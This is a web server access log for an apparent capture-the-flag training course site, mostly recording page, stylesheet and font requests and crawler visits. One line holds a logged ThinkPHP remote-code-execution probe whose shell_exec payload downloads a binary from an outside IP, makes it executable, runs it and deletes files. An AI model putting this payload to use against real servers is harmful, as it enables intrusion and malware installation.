12.240.32.81 - - [15/May/2022:00:00:19 +0300] "GET /f2035be396/c7e9d9807d/5401 HTTP/1.1" 301 162 "-" "-"
10.138.216.236 - - [15/May/2022:00:14:55 +0300] "GET /static/vollkorn/Vollkorn-Regular.woff2 HTTP/2.0" 304 0 "https://board.course.ugractf.ru/static/vollkorn/vollkorn.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
90.127.140.66 - - [15/May/2022:00:14:55 +0300] "GET /tasks/allfields/flag_iframe HTTP/2.0" 303 234 "https://course.ugractf.ru/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
12.240.32.81 - - [15/May/2022:00:14:55 +0300] "GET /signup_iframe HTTP/2.0" 200 1626 "https://course.ugractf.ru/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
131.161.189.58 - - [15/May/2022:00:14:55 +0300] "GET /static/book.css HTTP/2.0" 304 0 "https://board.course.ugractf.ru/signup_iframe" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
121.14.140.168 - - [15/May/2022:00:14:55 +0300] "GET /static/book-nav.css HTTP/2.0" 304 0 "https://board.course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
210.174.161.29 - - [15/May/2022:00:14:55 +0300] "GET /static/book-misc.css HTTP/2.0" 304 0 "https://board.course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
216.235.93.215 - - [15/May/2022:00:14:55 +0300] "GET /static/book-text.css HTTP/2.0" 304 0 "https://board.course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
169.146.12.162 - - [15/May/2022:00:14:55 +0300] "GET /static/book-iframe.css HTTP/2.0" 304 0 "https://board.course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
152.197.87.18 - - [15/May/2022:00:14:55 +0300] "GET /static/inter/inter.css HTTP/2.0" 304 0 "https://board.course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
210.232.144.196 - - [15/May/2022:00:14:55 +0300] "GET /static/vollkorn/vollkorn.css HTTP/2.0" 304 0 "https://board.course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
110.178.111.29 - - [15/May/2022:00:14:55 +0300] "GET /static/jb/jb.css HTTP/2.0" 304 0 "https://board.course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
108.125.229.104 - - [15/May/2022:00:14:56 +0300] "GET /static/inter/Inter-roman.var.woff2?v=3.12 HTTP/2.0" 304 0 "https://board.course.ugractf.ru/static/inter/inter.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
83.69.231.61 - - [15/May/2022:00:14:56 +0300] "GET /static/vollkorn/Vollkorn-Regular.woff2 HTTP/2.0" 304 0 "https://board.course.ugractf.ru/static/vollkorn/vollkorn.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
233.228.83.222 - - [15/May/2022:00:15:06 +0300] "GET /actuator/health HTTP/1.1" 404 146 "-" "Mozilla/5.0 zgrab/0.x"
14.81.209.218 - - [15/May/2022:00:15:14 +0300] "POST /signup_iframe HTTP/2.0" 200 1859 "https://board.course.ugractf.ru/signup_iframe" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
255.219.179.189 - - [15/May/2022:00:15:14 +0300] "GET /static/book.css HTTP/2.0" 304 0 "https://board.course.ugractf.ru/signup_iframe" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
241.180.99.143 - - [15/May/2022:00:15:14 +0300] "GET /static/book-nav.css HTTP/2.0" 304 0 "https://board.course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
98.146.124.126 - - [15/May/2022:00:15:14 +0300] "GET /static/book-misc.css HTTP/2.0" 304 0 "https://board.course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
125.182.150.225 - - [15/May/2022:00:15:14 +0300] "GET /static/book-text.css HTTP/2.0" 304 0 "https://board.course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
128.91.215.100 - - [15/May/2022:00:15:14 +0300] "GET /static/book-iframe.css HTTP/2.0" 304 0 "https://board.course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
194.139.67.55 - - [15/May/2022:00:15:14 +0300] "GET /static/inter/inter.css HTTP/2.0" 304 0 "https://board.course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
221.133.60.152 - - [15/May/2022:00:15:14 +0300] "GET /static/vollkorn/vollkorn.css HTTP/2.0" 304 0 "https://board.course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
136.168.33.78 - - [15/May/2022:00:15:14 +0300] "GET /static/jb/jb.css HTTP/2.0" 304 0 "https://board.course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
108.239.244.26 - - [15/May/2022:00:15:14 +0300] "GET /static/inter/Inter-roman.var.woff2?v=3.12 HTTP/2.0" 304 0 "https://board.course.ugractf.ru/static/inter/inter.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
70.96.96.131 - - [15/May/2022:00:15:14 +0300] "GET /static/vollkorn/Vollkorn-Regular.woff2 HTTP/2.0" 304 0 "https://board.course.ugractf.ru/static/vollkorn/vollkorn.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
220.13.33.23 - - [15/May/2022:00:16:45 +0300] "GET / HTTP/1.1" 200 147 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
223.113.196.134 - - [15/May/2022:00:17:34 +0300] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36"
190.21.252.241 - - [15/May/2022:00:17:37 +0300] "GET / HTTP/1.1" 200 3946 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36"
246.39.148.14 - - [15/May/2022:00:20:17 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://144.172.70.166/bns/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 150 "-" "puzzles/2.0"
142.56.20.2 - - [15/May/2022:00:29:39 +0300] "GET /tasks/betagost/ HTTP/2.0" 404 146 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
250.189.108.152 - - [15/May/2022:00:30:01 +0300] "GET /robots.txt HTTP/2.0" 404 232 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
82.217.223.163 - - [15/May/2022:00:30:08 +0300] "GET / HTTP/2.0" 303 218 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
213.143.207.75 - - [15/May/2022:00:32:46 +0300] "GET /stegano/setup.html HTTP/2.0" 200 4770 "https://away.vk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.4.731 Yowser/2.5 Safari/537.36"
140.174.34.162 - - [15/May/2022:00:32:46 +0300] "GET /static/book.css HTTP/2.0" 200 4872 "https://course.ugractf.ru/stegano/setup.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.4.731 Yowser/2.5 Safari/537.36"
149.227.50.92 - - [15/May/2022:00:32:46 +0300] "GET /static/highlight/styles/github.css HTTP/2.0" 200 1148 "https://course.ugractf.ru/stegano/setup.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.4.731 Yowser/2.5 Safari/537.36"
30.243.224.23 - - [15/May/2022:00:32:46 +0300] "GET /static/book.js HTTP/2.0" 200 1116 "https://course.ugractf.ru/stegano/setup.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.4.731 Yowser/2.5 Safari/537.36"
161.216.193.107 - - [15/May/2022:00:32:46 +0300] "GET /static/highlight/highlight.pack.js HTTP/2.0" 200 108750 "https://course.ugractf.ru/stegano/setup.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.4.731 Yowser/2.5 Safari/537.36"
53.78.87.0 - - [15/May/2022:00:32:46 +0300] "GET /static/graphic/logo_l.svg HTTP/2.0" 200 2841 "https://course.ugractf.ru/stegano/setup.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.4.731 Yowser/2.5 Safari/537.36"
9.194.240.254 - - [15/May/2022:00:32:46 +0300] "GET /static/book-nav.css HTTP/2.0" 200 3973 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.4.731 Yowser/2.5 Safari/537.36"
136.14.56.252 - - [15/May/2022:00:32:46 +0300] "GET /static/book-misc.css HTTP/2.0" 200 3119 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.4.731 Yowser/2.5 Safari/537.36"
153.143.185.42 - - [15/May/2022:00:32:46 +0300] "GET /static/book-text.css HTTP/2.0" 200 5407 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.4.731 Yowser/2.5 Safari/537.36"
87.142.243.1 - - [15/May/2022:00:32:46 +0300] "GET /static/inter/inter.css HTTP/2.0" 200 398 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.4.731 Yowser/2.5 Safari/537.36"
20.132.118.192 - - [15/May/2022:00:32:46 +0300] "GET /static/vollkorn/vollkorn.css HTTP/2.0" 200 388 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.4.731 Yowser/2.5 Safari/537.36"
49.113.164.128 - - [15/May/2022:00:32:46 +0300] "GET /static/jb/jb.css HTTP/2.0" 200 146 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.4.731 Yowser/2.5 Safari/537.36"
248.113.135.155 - - [15/May/2022:00:32:46 +0300] "GET /static/graphic/loupe.svg HTTP/2.0" 200 2981 "https://course.ugractf.ru/static/book-nav.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.4.731 Yowser/2.5 Safari/537.36"
61.105.91.41 - - [15/May/2022:00:32:47 +0300] "GET /static/inter/Inter-roman.var.woff2?v=3.12 HTTP/2.0" 200 226368 "https://course.ugractf.ru/static/inter/inter.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.4.731 Yowser/2.5 Safari/537.36"
213.173.96.62 - - [15/May/2022:00:32:47 +0300] "GET /static/jb/jb.woff2?v=10.12 HTTP/2.0" 200 44688 "https://course.ugractf.ru/static/jb/jb.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.4.731 Yowser/2.5 Safari/537.36"
11.43.254.153 - - [15/May/2022:00:32:47 +0300] "GET /static/vollkorn/Vollkorn-Regular.woff2 HTTP/2.0" 200 152936 "https://course.ugractf.ru/static/vollkorn/vollkorn.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.4.731 Yowser/2.5 Safari/537.36"
51.31.163.153 - - [15/May/2022:00:32:47 +0300] "GET /static/vollkorn/Vollkorn-Italic.woff2 HTTP/2.0" 200 135048 "https://course.ugractf.ru/static/vollkorn/vollkorn.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.4.731 Yowser/2.5 Safari/537.36"
123.95.230.178 - - [15/May/2022:00:32:48 +0300] "GET /static/favicon.png HTTP/2.0" 200 551 "https://course.ugractf.ru/stegano/setup.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.4.731 Yowser/2.5 Safari/537.36"
146.55.73.109 - - [15/May/2022:00:36:48 +0300] "GET /web/stegano/pictures.html HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
51.31.163.153 - - [15/May/2022:00:37:02 +0300] "GET /stegano/history.html HTTP/2.0" 200 5132 "https://course.ugractf.ru/stegano/setup.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.4.731 Yowser/2.5 Safari/537.36"
12.221.22.172 - - [15/May/2022:00:37:38 +0300] "GET /ppc/index.html HTTP/1.1" 200 4325 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
127.218.114.119 - - [15/May/2022:00:38:26 +0300] "GET /web/index.html HTTP/1.1" 200 2729 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
122.241.228.141 - - [15/May/2022:00:38:27 +0300] "GET /archive/upmlctf-2016 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
225.163.145.39 - - [15/May/2022:00:39:15 +0300] "GET /archive/upmlctf-2017-summer HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
115.17.164.63 - - [15/May/2022:00:39:16 +0300] "GET /crypto/index.html HTTP/1.1" 200 3829 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
210.2.50.92 - - [15/May/2022:00:40:01 +0300] "GET /crypto/coding.html HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
139.104.172.100 - - [15/May/2022:00:40:02 +0300] "GET /archive/upmlctf-2017-autumn HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
85.19.16.72 - - [15/May/2022:00:40:48 +0300] "GET /archive/upmlctf-2018 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
112.243.143.158 - - [15/May/2022:00:40:49 +0300] "GET /robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
70.101.130.92 - - [15/May/2022:00:40:49 +0300] "GET /robots.txt HTTP/1.1" 404 232 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
167.104.42.219 - - [15/May/2022:00:40:49 +0300] "GET /robots.txt HTTP/1.1" 404 232 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
62.197.195.183 - - [15/May/2022:00:40:50 +0300] "GET / HTTP/1.1" 200 147 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
96.41.13.110 - - [15/May/2022:00:40:50 +0300] "GET /archive/ctf.upml.tech HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
30.248.194.253 - - [15/May/2022:00:41:34 +0300] "GET /archive/upmlctf-2017 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
167.105.161.15 - - [15/May/2022:00:41:34 +0300] "GET /reverse/xtra/fibonacci HTTP/1.1" 200 17160 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
44.181.186.212 - - [15/May/2022:00:42:20 +0300] "GET /osint/index.html HTTP/1.1" 200 3228 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
198.22.219.70 - - [15/May/2022:00:43:02 +0300] "GET /intro/index.html HTTP/1.1" 200 2298 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
77.230.44.95 - - [15/May/2022:00:43:44 +0300] "GET /forensics/files/traffic_demo_adv.pcap HTTP/1.1" 200 860308 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
182.58.203.104 - - [15/May/2022:00:43:45 +0300] "GET /archive/bank-bank-ctf HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
62.77.181.135 - - [15/May/2022:00:43:46 +0300] "GET /forensics/files/traffic_demo_intro.pcap HTTP/1.1" 200 1448 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
34.144.131.190 - - [15/May/2022:00:43:46 +0300] "GET /archive/upmlctf-2018-alpha HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
163.42.86.92 - - [15/May/2022:00:43:47 +0300] "GET /stegano/index.html HTTP/1.1" 200 3078 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
120.192.29.232 - - [15/May/2022:00:44:37 +0300] "GET /forensics/index.html HTTP/1.1" 200 3121 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
185.85.78.182 - - [15/May/2022:00:45:16 +0300] "GET /reverse/index.html HTTP/1.1" 200 3518 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
111.98.29.195 - - [15/May/2022:00:49:30 +0300] "GET /stegano/setup.html HTTP/2.0" 200 4770 "https://away.vk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
252.20.175.39 - - [15/May/2022:00:49:30 +0300] "GET /static/book.css HTTP/2.0" 200 4872 "https://course.ugractf.ru/stegano/setup.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
128.144.23.26 - - [15/May/2022:00:49:30 +0300] "GET /static/highlight/styles/github.css HTTP/2.0" 200 1148 "https://course.ugractf.ru/stegano/setup.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
89.53.189.124 - - [15/May/2022:00:49:30 +0300] "GET /static/book.js HTTP/2.0" 200 1116 "https://course.ugractf.ru/stegano/setup.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
102.136.69.204 - - [15/May/2022:00:49:30 +0300] "GET /static/highlight/highlight.pack.js HTTP/2.0" 200 108750 "https://course.ugractf.ru/stegano/setup.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
79.131.161.222 - - [15/May/2022:00:49:30 +0300] "GET /static/graphic/logo_l.svg HTTP/2.0" 200 2841 "https://course.ugractf.ru/stegano/setup.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
144.144.236.182 - - [15/May/2022:00:49:30 +0300] "GET /static/book-nav.css HTTP/2.0" 200 3973 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
184.193.99.202 - - [15/May/2022:00:49:30 +0300] "GET /static/book-misc.css HTTP/2.0" 200 3119 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
30.248.194.253 - - [15/May/2022:00:49:30 +0300] "GET /static/book-text.css HTTP/2.0" 200 5407 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
251.174.78.207 - - [15/May/2022:00:49:30 +0300] "GET /static/inter/inter.css HTTP/2.0" 200 398 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.248.220.87 - - [15/May/2022:00:49:30 +0300] "GET /static/vollkorn/vollkorn.css HTTP/2.0" 200 388 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.58.131.189 - - [15/May/2022:00:49:30 +0300] "GET /static/jb/jb.css HTTP/2.0" 200 146 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
114.113.187.175 - - [15/May/2022:00:49:31 +0300] "GET /static/graphic/loupe.svg HTTP/2.0" 200 2981 "https://course.ugractf.ru/static/book-nav.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
218.228.109.193 - - [15/May/2022:00:49:31 +0300] "GET /static/inter/Inter-roman.var.woff2?v=3.12 HTTP/2.0" 200 226368 "https://course.ugractf.ru/static/inter/inter.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
62.197.195.183 - - [15/May/2022:00:49:31 +0300] "GET /static/vollkorn/Vollkorn-Regular.woff2 HTTP/2.0" 200 152936 "https://course.ugractf.ru/static/vollkorn/vollkorn.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
209.217.96.115 - - [15/May/2022:00:49:31 +0300] "GET /static/vollkorn/Vollkorn-Italic.woff2 HTTP/2.0" 200 135048 "https://course.ugractf.ru/static/vollkorn/vollkorn.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
